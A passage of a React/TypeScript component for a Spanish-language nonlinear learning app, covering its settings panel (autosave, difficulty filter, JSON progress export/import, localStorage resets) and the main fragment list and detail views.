                  onChange={(e) => handleSettingChange('greenMode', e.target.checked)}
                />
              </div>
            </div>
          </div>
          
          {/* Configuraciones de Aprendizaje */}
          <div>
            <h3 className={`${theme.text} text-xl font-semibold mb-4`}>Configuración de Aprendizaje</h3>
            <div className="space-y-4">
              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <div>
                  <h4 className="text-white font-medium">Guardado Automático</h4>
                  <p className="text-gray-400 text-sm">Guardar progreso automáticamente</p>
                </div>
                <button
                  onClick={() => handleSettingChange('autoSave', !settings.autoSave)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${settings.autoSave ? 'bg-purple-600' : 'bg-gray-600'}`}
                >
                  <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${settings.autoSave ? 'translate-x-6' : 'translate-x-1'}`} />
                </button>
              </div>
              
              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <div>
                  <h4 className="text-white font-medium">Avance Automático</h4>
                  <p className="text-gray-400 text-sm">Activar fragmentos relacionados automáticamente</p>
                </div>
                <button
                  onClick={() => handleSettingChange('autoAdvance', !settings.autoAdvance)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${settings.autoAdvance ? 'bg-purple-600' : 'bg-gray-600'}`}
                >
                  <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${settings.autoAdvance ? 'translate-x-6' : 'translate-x-1'}`} />
                </button>
              </div>
              
              <div className="p-4 bg-slate-700/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">Filtro de Dificultad</h4>
                <p className="text-gray-400 text-sm mb-3">Mostrar solo fragmentos de cierto nivel</p>
                <select
                  value={settings.difficultyFilter}
                  onChange={(e) => handleSettingChange('difficultyFilter', e.target.value)}
                  className="w-full bg-slate-600 border border-slate-500 text-white py-2 px-3 rounded-lg focus:outline-none focus:border-purple-500"
                >
                  <option value="all">Todos los niveles</option>
                  <option value="1">Solo nivel 1</option>
                  <option value="2">Hasta nivel 2</option>
                  <option value="3">Hasta nivel 3</option>
                  <option value="4">Hasta nivel 4</option>
                  <option value="5">Todos los niveles</option>
                </select>
              </div>
            </div>
          </div>
          
          {/* Gestión de Datos */}
          <div>
            <h3 className="text-white text-xl font-semibold mb-4">Gestión de Datos</h3>
            <div className="space-y-4">
              
              {/* Exportación Moderna con Descarga Directa */}
              <div className="p-4 bg-slate-700/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">📥 Exportar Progreso (Recomendado)</h4>
                <p className="text-gray-400 text-sm mb-3">Descarga tu progreso y configuración como archivo JSON</p>
                <button
                  onClick={handleDownloadProgress}
                  className="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 px-4 py-2 rounded-lg text-white font-medium transition-all"
                >
                  📁 Descargar Progreso
                </button>
              </div>

              {/* Importación Moderna con Subida de Archivos */}
              <div className="p-4 bg-slate-700/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">📤 Importar Progreso (Recomendado)</h4>
                <p className="text-gray-400 text-sm mb-3">Sube un archivo JSON para restaurar tu progreso</p>
                <input
                  id="jsonFileUpload"
                  type="file"
                  accept="application/json,.json"
                  className="hidden"
                  onChange={handleFileImport}
                />
                <label htmlFor="jsonFileUpload">
                  <button
                    type="button"
                    onClick={() => {
                      const fileUpload = document.getElementById('jsonFileUpload') as HTMLInputElement;
                      fileUpload?.click();
                    }}
                    className="bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700 px-4 py-2 rounded-lg text-white font-medium transition-all cursor-pointer"
                  >
                    📂 Subir Archivo JSON
                  </button>
                </label>
              </div>

              {/* Exportación Manual (Clásica) */}
              <div className="p-4 bg-slate-700/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">📋 Exportar Datos (Manual)</h4>
                <p className="text-gray-400 text-sm mb-3">Genera JSON para copiar manualmente</p>
                <button
                  onClick={handleExportData}
                  className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-white font-medium mb-3"
                >
                  Generar Exportación
                </button>
                {exportData && (
                  <textarea
                    value={exportData}
                    readOnly
                    className="w-full h-32 bg-slate-600 border border-slate-500 text-white p-3 rounded-lg font-mono text-sm"
                    placeholder="Los datos exportados aparecerán aquí..."
                  />
                )}
              </div>
              
              {/* Importación Manual (Clásica) */}
              <div className="p-4 bg-slate-700/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">📝 Importar Datos (Manual)</h4>
                <p className="text-gray-400 text-sm mb-3">Pega JSON copiado manualmente</p>
                <textarea
                  value={importData}
                  onChange={(e) => setImportData(e.target.value)}
                  className="w-full h-32 bg-slate-600 border border-slate-500 text-white p-3 rounded-lg font-mono text-sm mb-3"
                  placeholder="Pega aquí los datos exportados..."
                />
                <button
                  onClick={handleImportData}
                  className="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg text-white font-medium"
                >
                  Importar Datos
                </button>
              </div>
            </div>
          </div>
          
          {/* Zona de Peligro */}
          <div>
            <h3 className="text-white text-xl font-semibold mb-4 text-red-400">Zona de Peligro</h3>
            <div className="space-y-4">
              <div className="p-4 bg-red-900/20 border border-red-500/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">Resetear Progreso</h4>
                <p className="text-gray-400 text-sm mb-3">Desactiva todos los fragmentos y vuelve al estado inicial</p>
                <button
                  onClick={handleResetProgress}
                  className="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-white font-medium"
                >
                  Resetear Progreso
                </button>
              </div>
              
              <div className="p-4 bg-red-900/20 border border-red-500/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">Resetear Configuración</h4>
                <p className="text-gray-400 text-sm mb-3">Restaura todas las configuraciones a sus valores por defecto</p>
                <button
                  onClick={handleResetSettings}
                  className="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-white font-medium"
                >
                  Resetear Configuración
                </button>
              </div>

              <div className="p-4 bg-orange-900/20 border border-orange-500/50 rounded-lg">
                <h4 className="text-white font-medium mb-2">🔄 Reset Total del Sistema</h4>
                <p className="text-gray-400 text-sm mb-3">
                  Limpia completamente el localStorage y fuerza el uso de los fragmentos actualizados del código. 
                  <br/><strong>Usa esto si sigues viendo los fragmentos antiguos en lugar de los 50 nuevos.</strong>
                </p>
                <button
                  onClick={() => {
                    if (confirm("¿RESET TOTAL del sistema? Esto limpiará TODOS los datos guardados y forzará el uso de los fragmentos más recientes del código. ¿Continuar?")) {
                      // Limpiar completamente el localStorage
                      localStorage.removeItem('learningFragments');
                      localStorage.removeItem('learningSettings');
                      localStorage.removeItem('learningProgress');
                      localStorage.removeItem('learningAchievements');
                      
                      // Forzar recarga para que use los datos del código
                      window.location.reload();
                    }
                  }}
                  className="bg-orange-600 hover:bg-orange-700 px-4 py-2 rounded-lg text-white font-medium"
                >
                  🔄 Reset Total del Sistema
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className={`min-h-screen ${theme.gradient} ${theme.text}`}>
      {/* Header Fijo Mejorado */}
      <motion.header
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className={`fixed top-0 left-0 right-0 z-50 backdrop-blur-xl ${theme.header} border-b border-slate-700/50 shadow-2xl`}
      >
        <div className="max-w-7xl mx-auto px-6 py-4">
          {/* Fila principal: Logo, navegación y progreso */}
          <div className="flex items-center justify-between mb-4">
            {/* Logo y título */}
            <motion.div 
              className="flex items-center gap-4"
              whileHover={{ scale: 1.02 }}
            >
              <div className="relative">
                <div className="w-12 h-12 bg-gradient-to-br from-cyan-500 via-blue-500 to-purple-600 rounded-xl flex items-center justify-center shadow-xl shadow-blue-500/40">
                  <Network className="w-6 h-6 text-white" />
                </div>
                <div className="absolute -inset-1 bg-gradient-to-br from-cyan-500/20 via-blue-500/20 to-purple-600/20 rounded-xl blur-lg" />
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-400 bg-clip-text text-transparent">
                  Aprendizaje Simbiótico
                </h1>
                <p className="text-slate-400 text-sm">Sistema de conocimiento no lineal</p>
              </div>
            </motion.div>

            {/* Navegación por tabs centrada - Ajustes ocultos según solicitud del usuario */}
            <div className="flex bg-slate-800/80 backdrop-blur-xl rounded-xl p-1.5 border border-slate-600/50 shadow-lg">
              {[
                { id: 'fragments', icon: BookOpen, label: 'Fragmentos', color: 'blue' },
                { id: 'network', icon: Network, label: 'Red', color: 'purple' },
                { id: 'progress', icon: TrendingUp, label: 'Progreso', color: 'emerald' },
                { id: 'settings', icon: RefreshCw, label: 'Ajustes', color: 'slate' } // Oculto por solicitud del usuario
              ].map(({ id, icon: Icon, label, color }) => (
                <motion.button
                  key={id}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => handleViewChange(id as ViewType)}
                  className={`
                    relative px-4 py-2.5 rounded-lg text-sm font-medium transition-all duration-300 flex items-center gap-2 min-w-[110px] justify-center
                    ${currentView === id 
                      ? color === 'blue' ? 'bg-gradient-to-r from-blue-500 to-cyan-500 text-white shadow-lg shadow-blue-500/30' :
                        color === 'purple' ? 'bg-gradient-to-r from-purple-500 to-pink-500 text-white shadow-lg shadow-purple-500/30' :
                        color === 'emerald' ? 'bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg shadow-emerald-500/30' :
                        'bg-gradient-to-r from-slate-600 to-slate-700 text-white shadow-lg shadow-slate-500/30'
                      : 'text-slate-300 hover:text-white hover:bg-slate-700/60'
                    }
                  `}
                >
                  <Icon className="w-4 h-4" />
                  <span className="hidden md:inline">{label}</span>
                </motion.button>
              ))}
            </div>

            {/* Indicador de progreso compacto */}
            <div className="flex items-center gap-3 bg-slate-800/80 backdrop-blur-xl rounded-xl px-4 py-2.5 border border-slate-600/50 shadow-lg">
              <div className="w-8 h-8 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-500/30">
                <span className="text-white text-xs font-bold">
                  {Math.round((fragments.filter(f => f.activated).length / fragments.length) * 100)}%
                </span>
              </div>
              <div className="text-sm">
                <div className="text-white font-medium text-xs">
                  {fragments.filter(f => f.activated).length}/{fragments.length}
                </div>
                <div className="text-slate-400 text-xs">Activados</div>
              </div>
            </div>
          </div>

          {/* Barra de progreso visual */}
          <div className="mb-4">
            <div className="relative h-2 bg-slate-800/60 rounded-full overflow-hidden border border-slate-700/50">
              <motion.div
                className="h-full bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 relative"
                initial={{ width: 0 }}
                animate={{ 
                  width: `${(fragments.filter(f => f.activated).length / fragments.length) * 100}%`
                }}
                transition={{ duration: 1.5, ease: "easeOut" }}
              >
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent" />
                <div className="absolute inset-0 bg-gradient-to-b from-white/20 to-transparent" />
              </motion.div>
            </div>
          </div>

          {/* Solo mostrar búsqueda y filtros en vista de fragmentos */}
          {currentView === 'fragments' && (
            <div className="flex items-center gap-4">
              <SearchBar 
                searchTerm={searchTerm}
                onSearchChange={handleSearchChange}
                resultsCount={filteredFragments.length}
              />
              <CategoryFilter 
                categories={categories}
                selectedCategory={filterCategory}
                onCategoryChange={handleCategoryChange}
              />
            </div>
          )}
        </div>
      </motion.header>

      {/* Contenido principal con margen superior para header fijo */}
      <div className="pt-[180px] max-w-[1600px] mx-auto px-4 py-6">
        {currentView === 'fragments' && (
          <div className="flex gap-6 h-[calc(100vh-260px)]">
            {/* Panel de fragmentos mejorado con scroll vertical */}
            <div className="w-96 flex-shrink-0 space-y-4">
              {/* Stats cards rediseñadas */}
              <div className="grid grid-cols-2 gap-4 mb-6">
                {[
                  {
                    label: 'Activos',
                    value: fragments.filter(f => f.activated).length,
                    icon: CheckCircle,
                    gradient: 'from-emerald-500 to-teal-500',
                    glow: 'emerald-500/30'
                  },
                  {
                    label: 'Total',
                    value: fragments.length,
                    icon: BookOpen,
                    gradient: 'from-blue-500 to-cyan-500',
                    glow: 'blue-500/30'
                  }
                ].map((stat, index) => (
                  <motion.div
                    key={stat.label}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: index * 0.1 }}
                    className="group relative"
                  >
                    {/* Glow effect */}
                    <div className={`absolute -inset-1 bg-gradient-to-br ${stat.gradient} opacity-0 group-hover:opacity-20 blur-lg rounded-2xl transition-all duration-500`} />
                    
                    {/* Card container */}
                    <div className="relative bg-gradient-to-br from-slate-800/90 to-slate-900/90 backdrop-blur-xl border border-slate-600/50 rounded-2xl p-4 hover:border-slate-500/50 transition-all duration-300 shadow-lg">
                      {/* Top highlight */}
                      <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-white/20 to-transparent" />
                      
                      <div className="flex items-center justify-between">
                        <div>
                          <p className="text-slate-400 text-xs font-medium uppercase tracking-wider">{stat.label}</p>
                          <p className="text-2xl font-bold text-white mt-1">{stat.value}</p>
                        </div>
                        <div className={`p-3 bg-gradient-to-br ${stat.gradient} rounded-xl shadow-lg shadow-${stat.glow}`}>
                          <stat.icon className="w-5 h-5 text-white" />
                        </div>
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>

              {/* Menú de fragmentos con scroll vertical mejorado */}
              <div className="h-[calc(100vh-400px)] overflow-y-auto scrollbar-thin scrollbar-thumb-slate-600/50 scrollbar-track-transparent hover:scrollbar-thumb-slate-500/70 pr-2">
                <div className="space-y-3">
                  {filteredFragments.map((fragment, index) => (
                    <motion.div
                      key={fragment.id}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: index * 0.05 }}
                      onClick={() => handleSelectFragment(fragment)}
                      className={`
                        group relative cursor-pointer rounded-xl p-4 border transition-all duration-300
                        ${selectedFragment?.id === fragment.id
                          ? 'bg-gradient-to-br from-blue-500/20 to-purple-500/20 border-blue-400/50 shadow-lg shadow-blue-500/20'
                          : 'bg-slate-800/50 border-slate-600/30 hover:bg-slate-700/60 hover:border-slate-500/50'
                        }
                      `}
                    >
                      {/* Indicador de activación */}
                      <div className={`
                        absolute top-2 right-2 w-3 h-3 rounded-full border-2
                        ${fragment.activated 
                          ? 'bg-emerald-500 border-emerald-400 shadow-lg shadow-emerald-500/50'
                          : 'bg-slate-600 border-slate-500'
                        }
                      `} />
                      
                      {/* Contenido del fragmento */}
                      <div className="pr-6">
                        <h3 className="text-white font-semibold text-sm mb-1 line-clamp-2">
                          {fragment.title}
                        </h3>
                        <p className="text-slate-400 text-xs mb-2 line-clamp-2">
                          {fragment.summary}
                        </p>
                        
                        {/* Metadatos */}
                        <div className="flex items-center justify-between">
                          <span className="text-xs px-2 py-1 bg-slate-700/60 text-slate-300 rounded-md">
                            {fragment.category.split(' ')[0]}
                          </span>
                          <div className="flex items-center gap-1">
                            {Array.from({ length: fragment.complexity }).map((_, i) => (
                              <div key={i} className="w-1.5 h-1.5 bg-yellow-500 rounded-full" />
                            ))}
                          </div>
                        </div>
                      </div>
                    </motion.div>
                  ))}
                </div>
              </div>
            </div>

            {/* Panel de detalle del fragmento con mejor distribución */}
            <div className="flex-1 bg-gradient-to-br from-slate-800/90 to-slate-900/90 backdrop-blur-xl border border-slate-600/50 rounded-2xl overflow-hidden shadow-2xl">
              {selectedFragment ? (
                <motion.div
                  key={selectedFragment.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="h-full flex flex-col"
                >
                  {/* Header del fragmento con mejor spacing */}
                  <div className="bg-gradient-to-r from-blue-600/20 to-purple-600/20 border-b border-slate-600/50 p-6">
                    <div className="flex items-start justify-between mb-4">
                      <div className="flex-1">
                        <h2 className="text-2xl font-bold text-white mb-2">{selectedFragment.title}</h2>
                        <p className="text-slate-300 text-sm leading-relaxed mb-4">{selectedFragment.summary}</p>
                        
                        {/* Metadatos mejorados */}
                        <div className="flex items-center gap-4 flex-wrap">
                          <span className="px-3 py-1 bg-slate-700/60 text-slate-300 text-sm rounded-lg">
                            {selectedFragment.category}
                          </span>
                          <div className="flex items-center gap-1">
                            <span className="text-slate-400 text-sm">Complejidad:</span>
                            {Array.from({ length: selectedFragment.complexity }).map((_, i) => (
                              <div key={i} className="w-2 h-2 bg-yellow-500 rounded-full" />
                            ))}
                          </div>
                          {selectedFragment.prerequisites.length > 0 && (
                            <span className="text-slate-400 text-sm">
                              {selectedFragment.prerequisites.length} prerequisito(s)
                            </span>
                          )}
                        </div>
                      </div>
                      
                      {/* Botón de activación mejorado */}
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={() => handleActivateFragment(selectedFragment.id)}
                        className={`
                          px-6 py-3 rounded-xl font-medium transition-all duration-300 flex items-center gap-2 min-w-[120px] justify-center
                          ${selectedFragment.activated
                            ? 'bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg shadow-emerald-500/30'
                            : 'bg-gradient-to-r from-blue-500 to-purple-500 text-white shadow-lg shadow-blue-500/30 hover:shadow-blue-500/50'
                          }
                        `}
                      >
                        {selectedFragment.activated ? (
                          <>
                            <CheckCircle className="w-4 h-4" />
                            Activado
                          </>
                        ) : (
                          <>
                            <Zap className="w-4 h-4" />
                            Activar
                          </>
                        )}
                      </motion.button>
                    </div>
                  </div>

                  {/* Contenido scrolleable del fragmento */}
                  <div className="flex-1 overflow-y-auto scrollbar-thin scrollbar-thumb-slate-600/50 scrollbar-track-transparent p-6">
                    {selectedFragment.content && (
                      <div className="space-y-8">
                        {/* Teoría */}
                        {selectedFragment.content.theory && (
                          <div>
                            <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                              <BookOpen className="w-5 h-5" />
                              Teoría
                            </h3>
                            <div className="prose prose-invert max-w-none">
                              <div 
                                className="text-slate-300 leading-relaxed whitespace-pre-wrap"
                                dangerouslySetInnerHTML={{ __html: selectedFragment.content.theory.replace(/```(\w+)?\n([\s\S]*?)```/g, '<pre class="bg-slate-900/60 border border-slate-600/50 rounded-lg p-4 overflow-x-auto my-4"><code class="text-cyan-400">$2</code></pre>') }}
                              />
                            </div>
                          </div>
                        )}

                        {/* Ejemplos */}
                        {selectedFragment.content.examples && selectedFragment.content.examples.length > 0 && (
                          <div>
                            <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                              <Code className="w-5 h-5" />
                              Ejemplos Prácticos
                            </h3>
                            <div className="space-y-6">
                              {selectedFragment.content.examples.map((example, idx) => (
                                <div key={idx} className="bg-slate-900/40 border border-slate-600/30 rounded-xl overflow-hidden">
                                  <div className="bg-slate-800/60 px-4 py-3 border-b border-slate-600/30">
                                    <h4 className="text-white font-medium">{example.title}</h4>
                                  </div>
                                  <pre className="p-4 overflow-x-auto">
                                    <code className="text-cyan-400 text-sm">{example.code}</code>
                                  </pre>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {/* Ejercicios */}
                        {selectedFragment.content.exercises && selectedFragment.content.exercises.length > 0 && (
                          <div>
                            <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                              <Brain className="w-5 h-5" />
                              Ejercicios Prácticos
                            </h3>
                            <div className="space-y-4">
                              {selectedFragment.content.exercises.map((exercise, idx) => (
                                <div key={idx} className="bg-slate-900/40 border border-slate-600/30 rounded-xl p-4">
                                  <h4 className="text-white font-medium mb-2">{exercise.title}</h4>
                                  <p className="text-slate-300 mb-3 leading-relaxed">{exercise.description}</p>
                                  {exercise.steps && (
                                    <details className="group">
                                      <summary className="cursor-pointer text-blue-400 font-medium mb-2 flex items-center hover:text-blue-300 transition-colors">
                                        📋 Ver pasos detallados
                                        <ChevronDown className="w-4 h-4 ml-2 transform group-open:rotate-180 transition-transform" />
                                      </summary>
                                      <div className="mt-3 pl-4 border-l-2 border-blue-500/30 space-y-2">
                                        {exercise.steps.map((step: any, stepIndex: number) => (
                                          <p key={stepIndex} className="text-slate-400 leading-relaxed">{step}</p>
                                        ))}
                                        {exercise.hint && (
                                          <div className="mt-4 p-3 bg-yellow-900/20 border border-yellow-500/30 rounded-lg">
                                            <p className="text-yellow-300">💡 <strong>Pista:</strong> {exercise.hint}</p>
                                          </div>
                                        )}
                                      </div>
                                    </details>
                                  )}
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {/* Recursos */}
                        {selectedFragment.content.resources && selectedFragment.content.resources.length > 0 && (
                          <div>
                            <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                              <Globe className="w-5 h-5" />
                              Recursos Adicionales
                            </h3>
                            <div className="grid gap-3">
                              {selectedFragment.content.resources.map((resource, idx) => (
                                <a
                                  key={idx}
                                  href={resource.url}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="block p-4 bg-slate-900/40 border border-slate-600/30 rounded-lg hover:bg-slate-800/60 hover:border-slate-500/50 transition-all duration-300 group"
                                >
                                  <h4 className="text-white font-medium group-hover:text-blue-400 transition-colors">
                                    {resource.title}
                                  </h4>
                                  {resource.description && (
                                    <p className="text-slate-400 text-sm mt-1">{resource.description}</p>
                                  )}
                                </a>
                              ))}
                            </div>
                          </div>
                        )}

                        {/* Tips */}
                        {selectedFragment.content.tips && selectedFragment.content.tips.length > 0 && (
                          <div>
                            <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                              💡 Tips Profesionales
                            </h3>
                            <div className="space-y-3">
                              {selectedFragment.content.tips.map((tip, idx) => (
                                <div key={idx} className="p-4 bg-blue-900/20 border border-blue-500/30 rounded-lg">
                                  <p className="text-blue-300 leading-relaxed">{tip}</p>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                </motion.div>
              ) : (
                <div className="flex flex-col items-center justify-center h-full text-center p-12">
                  <div className="w-32 h-32 bg-slate-800/50 rounded-full flex items-center justify-center mb-8">
                    <BookOpen className="w-16 h-16 text-slate-400" />
                  </div>
                  <h3 className="text-2xl font-semibold text-white mb-4">Selecciona un fragmento</h3>
                  <p className="text-slate-400 text-lg max-w-md leading-relaxed">
                    Explora y activa fragmentos para expandir tu conocimiento simbiótico. 
                    Cada fragmento contiene teoría, ejemplos y ejercicios prácticos.
                  </p>
                </div>
              )}
            </div>
          </div>
        )}

        {currentView === 'network' && <NetworkView />}
        {currentView === 'progress' && <ProgressView />}
        {currentView === 'settings' && (
          <SettingsView
            onDarkModeChange={setDarkMode}
            onGreenModeChange={setGreenMode}
          />
        )}
      </div>
    </div>
  );
};

export default React.memo(NonLinearLearning);